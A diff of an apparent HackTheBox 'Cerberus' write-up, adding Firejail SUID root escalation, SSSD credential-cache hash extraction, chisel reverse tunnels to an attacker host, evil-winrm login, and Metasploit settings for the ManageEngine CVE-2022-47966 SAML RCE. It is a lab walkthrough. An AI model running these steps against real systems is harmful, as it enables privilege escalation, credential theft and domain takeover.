@@ -14,7 +14,7 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 ```
 
-We have to add `icinga.cerberus.local` to our `/etc/hosts` file in order to access port 8080.&#x20;
+We have to add `icinga.cerberus.local` to our `/etc/hosts` file in order to access port 8080.
 
 ### Icinga LFI
 
@@ -158,9 +158,9 @@ With these credentials, we can login to the Icinga Web instance!
 
 I looked around, and determined that this was running **Icinga Web 2 Version 2.9.2**, which could be useful later. On the original page that gave us the directory traversal exploit, there was another RCE exploit, but I'm not sure how to exploit it yet.
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-I also found that as `matthew`, we could create new users. Reading the code from the Sonar website, we can see that there's a `/$configDir/ssh/matthew` directory that can store a private key.&#x20;
+I also found that as `matthew`, we could create new users. Reading the code from the Sonar website, we can see that there's a `/$configDir/ssh/matthew` directory that can store a private key.
 
 ```php
 public static function beforeAdd(ResourceConfigForm $form)
@@ -178,9 +178,9 @@ This, combined with the RCE exploit above is a clear attack vector. We need to g
 
 First we need to change the `global_module_path` to `/dev` as per the PoC. This can be done in `/config/general`.
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
-Then, we can quickly enable the `shm` module in `/config/moduleenable`.&#x20;
+Then, we can quickly enable the `shm` module in `/config/moduleenable`.
 
 <figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
 
@@ -225,7 +225,11 @@ I ran LinPEAS on the machine to enumerate for me. We can find some ports that ar
 
 <figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
-The MySQL database has nothing of interest. Port 80 was hosting nothing as well. For SUID binaries, there were two that I didn't usually see:
+The MySQL database has nothing of interest. Port 80 was hosting nothing as well.&#x20;
+
+### Firejail RCE
+
+For SUID binaries, there were two that I didn't usually see:
 
 <figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
@@ -236,12 +240,256 @@ www-data@icinga:/etc$ firejail --version
 firejail version 0.9.68rc1
 ```
 
-Technically this was exploitable and there are PoCs out there for this version, but the docker seems to have non of the imports required. \
-Moving on, we can look at the Linux version:
+This version is vulnerable to some RCE exploits, and since it is a SUID binary, we can use this to get to root. We can find a PoC on this website at the bottom of the page:
+
+{% embed url="https://www.openwall.com/lists/oss-security/2022/06/08/10" %}
+
+{% code overflow="wrap" %}
+```
+www-data@icinga:/tmp$ chmod +x firejail.py 
+www-data@icinga:/tmp$ ./firejail.py 
+You can now run 'firejail --join=1407' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
+```
+{% endcode %}
+
+We have to repeat the RCE exploit that we did previously to make this work. Then, we can run the command and be able to become root. **Take note we can just run `su -` for this to work.**
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Great! Now we have access as root on the Linux docker.&#x20;
+
+## Docker Escape
+
+Now that we had root user access on the container, we can enumerate the machine further. I spent a LOT of time looking around this machine. Checking the `/opt` directory, it seems we can view some Windows files:
 
 ```
-www-data@icinga:/tmp$ uname -a
-Linux icinga 5.15.0-43-generic #46-Ubuntu SMP Tue Jul 12 10:30:17 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+root@icinga:/opt# ls
+microsoft
+root@icinga:/opt# ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Jan 23 18:24 .
+drwxr-xr-x 18 root root 4096 Jan 23 18:22 ..
+drwxr-xr-x  3 root root 4096 Jan 23 18:24 microsoft
+root@icinga:/opt# cd microsoft/
+root@icinga:/opt/microsoft# ls -la
+total 12
+drwxr-xr-x 3 root root 4096 Jan 23 18:24 .
+drwxr-xr-x 3 root root 4096 Jan 23 18:24 ..
+drwxr-xr-x 3 root root 4096 Jan 23 18:24 powershell
+root@icinga:/opt/microsoft# cd powershell/
+root@icinga:/opt/microsoft/powershell# ls -la
+total 32
+drwxr-xr-x  3 root root  4096 Jan 23 18:24 .
+drwxr-xr-x  3 root root  4096 Jan 23 18:24 ..
+drwxr-xr-x 20 root root 24576 Jan 23 18:26 7
+root@icinga:/opt/microsoft/powershell# cd 7
+root@icinga:/opt/microsoft/powershell/7# ls -la
+total 182788
+drwxr-xr-x 20 root root    24576 Jan 23 18:26 .
+drwxr-xr-x  3 root root     4096 Jan 23 18:24 ..
+-rw-r--r--  1 root root     1074 Nov 23 03:26 LICENSE.txt
+-rw-r--r--  1 root root  1348536 Nov 23 04:01 Markdig.Signed.dll
+<TRUNCATED>
 ```
 
-Hard machine. Will continue to work on it.&#x20;
+### Credentials
+
+We must remember that this machine is joined via to a domain somehow. I googled about credentials being left behind in the machine, and found this gem:
+
+{% embed url="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sssd-introduction" %}
+
+So `sssd` is a method of which Linux machines can store credentials. This is in-line with a certain `createdump` file I found in `/opt/microsoft/powershell/7`, which was a binary with some Red Hat data.
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+We can enumerate the `/var/lib/sss` directory to see if we can find anything useful. There's a `db` folder:
+
+```
+root@icinga:/var/lib/sss/db# ls -la
+total 5036
+drwx------  2 root root    4096 Mar  2 12:33 .
+drwxr-xr-x 10 root root    4096 Jan 22 18:12 ..
+-rw-r--r--  1 root root 1286144 Mar 22 13:23 cache_cerberus.local.ldb
+-rw-------  1 root root    2715 Mar  2 12:33 ccache_CERBERUS.LOCAL
+-rw-------  1 root root 1286144 Mar 22 13:23 config.ldb
+-rw-------  1 root root 1286144 Jan 22 18:32 sssd.ldb
+-rw-r--r--  1 root root 1286144 Mar  1 12:07 timestamps_cerberus.local.ldb
+```
+
+When `strings` is used to view the `cache_cerberus.local.ldb` file, we can find a hashed password for `matthew`.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+This hash can be cracked instantly:
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+### Pivoting
+
+Now we have credentials, but we don't have an avenue to use them. The `nmap` scan earlier only picked up on port 8080 being detectable from this machine. So, it is likely the next step is **port forwarding**. I downloaded the `nmap` binary onto the machine, and started to scan the internal networks.
+
+Viewing the `/etc/hosts` file gave me the IP address of the DC:
+
+```
+root@icinga:/tmp# cat /etc/hosts
+127.0.0.1 iceinga.cerberus.local iceinga
+127.0.1.1 localhost
+172.16.22.1 DC.cerberus.local DC cerberus.local
+```
+
+I did a quick scan and found that the machine had port 5985 for WinRM open, meaning `evil-winrm` can be used to log in as `matthew`.&#x20;
+
+```
+root@icinga:/tmp# ./nmap_binary -p 1-10000 172.16.22.1
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-22 14:10 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Stats: 0:01:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 44.80% done; ETC: 14:14 (0:01:52 remaining)
+Stats: 0:02:51 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 84.80% done; ETC: 14:14 (0:00:31 remaining)
+Nmap scan report for DC.cerberus.local (172.16.22.1)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (-0.12s latency).
+Not shown: 9999 filtered ports
+PORT     STATE SERVICE
+5985/tcp open  unknown
+MAC Address: 00:15:5D:5F:E8:00 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 186.05 seconds
+```
+
+We can port forward using `chisel`.&#x20;
+
+```bash
+# on my machine
+chisel server -p 9001 --reverse
+# on icinga
+./chisel client 10.10.16.18:9001 R:5985:172.16.22.1:5985
+```
+
+Then we can `evil-winrm` in.
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+We can now capture the user flag!
+
+## AD Escalation
+
+Now that we are in the main Windows machine, we can try to become the domain admin / administrator of the machine. Looking at the `C:\Program Files (x86)` directory, we can find a `ManageEngine` directory
+
+```
+*Evil-WinRM* PS C:\Program Files (x86)> ls
+
+
+    Directory: C:\Program Files (x86)
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/15/2018  12:28 AM                Common Files
+d-----        3/22/2023   7:09 AM                Google
+d-----         9/7/2022   4:34 AM                Internet Explorer
+d-----        1/29/2023  11:12 AM                ManageEngine
+d-----        9/15/2018  12:19 AM                Microsoft.NET
+d-----        8/24/2021   7:47 AM                Windows Defender
+d-----        8/24/2021   7:47 AM                Windows Mail
+d-----         9/7/2022   4:34 AM                Windows Media Player
+d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
+d-----        9/15/2018  12:28 AM                windows nt
+d-----        8/24/2021   7:47 AM                Windows Photo Viewer
+d-----        9/15/2018  12:19 AM                Windows Portable Devices
+d-----        9/15/2018  12:19 AM                WindowsPowerShell
+```
+
+This directory contained files for `ADSelfService Plus`. This was an AD service used for SSO and Password Management on the domain.&#x20;
+
+### ADServicePlus Enumeration
+
+From what I can gather, this service opens a port and runs a web application. We can verify this using `netstat -an`:
+
+```
+*Evil-WinRM* PS C:\Program Files (x86)\ManageEngine\ADSelfService Plus> netstat -an
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:808            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:1500           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:1501           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:2179           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:9251           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
+```
+
+Let's try port forwarding to view the services running on these ports. We would have to port forward again using `chisel` to do this. Take&#x20;
+
+```bash
+# on my machine, with proxychains set up to port 1080
+./chisel server -p 9003  --reverse
+# on icinga WINDOWS
+./chisel client 10.10.16.18:9003 R:1080:socks
+```
+
+We need to add `DC.cerberus.local` with the IP of `172.16.22.1` to our `/etc/hosts` file before we can visit this in Firefox with proxychains. When visiting port 8888, we get redirected to the AD login page. Very similar to NUS's, interestingly.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+We can login with `matthew@cerberus.local` and the password we found earlier. This does nothing for us, however. All it does is provide a URL with a token appended at the back:&#x20;
+
+```
+https://dc:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
+```
+
+Not sure what to do with this though.
+
+### CVE Finding --> Lucky!
+
+One thing I've learnt with the newer HTB machines is that **they always use newer exploits available**. As such, we can try to find a new exploit and try it:
+
+{% embed url="https://www.cvedetails.com/vulnerability-list/vendor_id-9841/product_id-20523/Zohocorp-Manageengine-Adselfservice-Plus.html" %}
+
+The first was CVE-2022-47966, which was an Exec Code exploit. It seems to affect a huge number of versions, so let's just try this one. This particular exploit requires SAML SSO to be enabled, and it is on this website. The following link is visited when we first load the page before logging in
+
+{% code overflow="wrap" %}
+```
+https://dc.cerberus.local/adfs/ls/?SAMLRequest=pVNNj9owFLz3V1i%2Bk8RJgMQirCh0VSS2jSDbQy%2BV47ywlhKb2g7L%2Fvt1%2BNjSqqVSe7Jkz3tv3sx4cndoG7QHbYSSGSZegBFIriohtxl%2BLO4HCb6bvpsY1jbhjs46%2ByTX8L0DY9HMGNDW1c2VNF0LegN6Lzg8rlcZfrJ2Z6jvL%2BY0DYfE7xus1FZIfzRmSUUCMkqDOAgrPmKjcRyXSc0TNuaMMF4nSRnWGC3cFCGZPVK7NKy4x0GXoDvjNYqzxmdVbfzG%2BBgtFxn%2BFg3LIIySgPGSJBGJ47SuU0KSmI1IlJbgYMZ0sJTGMmkzHDr0IIgGYViQmMZjGg69NBp%2FxSjXyiqumvdCnvTotKSKGWGoZC0YajndzB5WNPQCWp5Ahn4sinyQf94UxwZ7UYH%2B5NAZfmCSbeGDdCIAmi020NRnxVDedAajLxcbwt4GZ4w09CT87dG7M088PflEjwtqdK90y%2Bzt2v5GVIP6CKUgrbAvP82%2BXc4uGcDT%2F3d84l%2FTn15C16u3XOSqEfwFzZpGPc81MOsUtbpzdv5tTeKRX9bspNkBF7WACvtvc865huqYchdqCweL5qrdMS1M7wscGLdvKl%2FD5o1TYg31Pyl3E8Yp73u769wdz0pXfSyBO56FZm4Rpe1FuN8xmp4f%2F7Dfj%2Bfrvz19BQ%3D%3D&RelayState=aHR0cHM6Ly9EQzo5MjUxL3NhbWxMb2dpbi9MT0dJTl9BVVRI
+```
+{% endcode %}
+
+I took a hint from the HTB forum, and it seems `metasploit` is the easiest way to exploit this. So let's boot `msfconsole` to exploit it. First, we can find the new module for this:
+
+{% embed url="https://github.com/rapid7/metasploit-framework/pull/17527" %}
+
+Either that or we can update `metasploit` and access the module via `use exploit/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966`. Looking at the options, the main ones to set are **GUID and ISSUER\_URL.**
+
+```
+set RHOSTS 172.16.22.1
+set LHOST tun0
+set SSL true
+set RPORT 9251
+set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
+set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
+```
+
+The last one was a struggle, because we have to find the identity provider for the target server. Quick googling reveals it however.
+
+When executed, we would get a meterpreter shell as the SYSTEM user.
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Using hints from the forum were really helpful, because I dislike using Metasploit and would have naturally avoided it.
